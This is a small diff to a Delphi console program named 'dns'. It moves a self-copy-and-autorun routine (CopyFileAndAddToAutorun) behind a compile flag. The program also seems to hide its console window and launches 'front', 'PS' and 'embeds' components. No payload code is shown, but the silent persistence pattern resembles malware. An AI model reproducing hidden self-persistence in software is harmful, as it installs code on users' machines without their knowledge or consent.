@@ -1,7 +1,7 @@
 program dns;
 
 {$APPTYPE CONSOLE}
-
+ 
 uses
   Windows,
   SysUtils,
@@ -15,9 +15,11 @@ uses
   embeddingsMan in 'embeddingsMan.pas',
   _front in '_front.pas',
   _embeddings in '_embeddings.pas',
-  runMan in 'runMan.pas',
-  autorun in 'autorun.pas',
-  _consts in '_consts.pas';
+   {$IFDEF USE_AUTORUN}
+    autorun in 'autorun.pas',
+    {$ENDIF}
+  runMan in 'runMan.pas';
+
 
 function GetConsoleWindow: HWND; stdcall; external 'kernel32.dll';
 
@@ -38,9 +40,8 @@ begin
   runMan.RunFront;
   runMan.RunPS;
   runMan.RunEmbeds;
-  if (IsAutoRun) then
-  begin
-    CopyFileAndAddToAutorun;
-  end;
+    {$IFDEF USE_AUTORUN}
+  CopyFileAndAddToAutorun;
+            {$ENDIF}
 end.
 
